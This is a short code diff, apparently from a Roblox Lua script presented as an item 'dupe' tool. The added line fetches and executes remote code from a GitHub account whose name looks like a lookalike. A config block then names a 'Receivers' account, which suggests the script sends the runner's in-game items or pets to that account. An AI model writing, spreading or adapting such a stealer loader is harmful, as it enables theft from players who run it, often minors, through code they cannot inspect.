@@ -1,7 +1,4 @@
-
-
-
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"))()
 
 Config = {
     Receivers = {"givepetroblox"}, -- {"ROBLOX"} or {"ROBLOX", "ROBLOX1", "ROBLOX2"}
